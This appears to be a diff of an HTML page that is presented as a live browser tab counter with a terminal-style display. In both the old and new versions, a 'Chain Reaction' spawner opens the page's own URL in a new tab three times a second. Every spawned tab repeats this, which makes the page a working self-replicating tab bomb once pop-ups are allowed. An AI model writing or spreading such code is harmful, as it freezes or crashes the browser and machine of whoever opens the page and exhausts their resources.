@@ -1,82 +1,75 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Global Tab Counter</title>
+    <title>Live Tab Tracker</title>
     <style>
-        body {
-            background: #0d0d0d;
-            color: #00e5ff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-        .container {
-            border: 2px solid #00e5ff;
-            padding: 30px;
-            text-align: center;
-            border-radius: 10px;
-            box-shadow: 0 0 15px #00e5ff;
-        }
-        #browser-id { color: #ff0055; font-weight: bold; }
-        #count { font-size: 100px; display: block; margin: 10px 0; }
+        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
+        .stat-box { border: 2px solid #00ff00; display: inline-block; padding: 20px; box-shadow: 0 0 20px #00ff00; }
+        #live-total { font-size: 120px; display: block; }
+        .glitch { animation: flash 0.1s infinite; color: #ff0055; }
+        @keyframes flash { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>DETECTED BROWSER: <span id="browser-id">Detecting...</span></h2>
-        <div id="count">0</div>
-        <p>TOTAL TABS IN SESSION</p>
+    <div class="stat-box">
+        <h1 id="status">SCANNING BROWSER...</h1>
+        <span id="live-total">0</span>
+        <p>ACTIVE INSTANCES DETECTED</p>
     </div>
 
     <script>
-        const countElement = document.getElementById('count');
-        const browserElement = document.getElementById('browser-id');
+        const myID = Math.random().toString(36).substring(7); // Give this tab a unique ID
+        const display = document.getElementById('live-total');
+        const statusTxt = document.getElementById('status');
 
-        // --- 1. Detect Browser Engine ---
-        function getBrowser() {
-            const ua = navigator.userAgent;
-            if (ua.includes("Edg/")) return "Microsoft Edge";
-            if (ua.includes("OPR/") || ua.includes("Opera")) return "Opera";
-            if (ua.includes("Chrome")) return "Google Chrome";
-            return "Unknown Browser";
-        }
-        browserElement.innerText = getBrowser();
-
-        // --- 2. Reliable Counting Logic ---
-        function updateTabCount() {
-            // Get current value or start at 0
-            let total = parseInt(localStorage.getItem('global_tab_count')) || 0;
-            total++;
-            localStorage.setItem('global_tab_count', total);
-            
-            // Show the updated number
-            countElement.innerText = total;
+        function pulse() {
+            // Tell the system this specific tab is still alive
+            localStorage.setItem('tab_pulse_' + myID, Date.now());
+            cleanupAndCount();
         }
 
-        // --- 3. Sync across all tabs ---
-        window.addEventListener('storage', (event) => {
-            if (event.key === 'global_tab_count') {
-                countElement.innerText = event.newValue;
+        function cleanupAndCount() {
+            let activeCount = 0;
+            const now = Date.now();
+
+            // Loop through everything in storage
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key.startsWith('tab_pulse_')) {
+                    const lastPulse = parseInt(localStorage.getItem(key));
+                    
+                    // If a tab hasn't pulsed in 3 seconds, it's probably closed/crashed
+                    if (now - lastPulse > 3000) {
+                        localStorage.removeItem(key);
+                    } else {
+                        activeCount++;
+                    }
+                }
             }
-        });
+            display.innerText = activeCount;
+        }
 
-        // --- 4. The Spawner ---
+        // Detect the Browser
+        const ua = navigator.userAgent;
+        if (ua.includes("Edg/")) statusTxt.innerText = "EDGE DETECTED";
+        else if (ua.includes("OPR/")) statusTxt.innerText = "OPERA DETECTED";
+        else statusTxt.innerText = "CHROME DETECTED";
+
+        // The "Chain Reaction" Spawner
         function spawn() {
+            // This opens the exact same file to keep the loop going
             window.open(window.location.href, '_blank');
         }
 
-        // Initialize and start the loop
-        updateTabCount();
+        // Run pulse every second
+        setInterval(pulse, 1000);
         
-        // This will only work if you have already clicked "Always allow popups"
-        // for this file in your browser's address bar!
-        setInterval(spawn, 333); 
+        // Try to spawn 3 per second (Only works if you allow popups once!)
+        setInterval(spawn, 333);
+
+        // Initial pulse
+        pulse();
     </script>
 </body>
 </html>
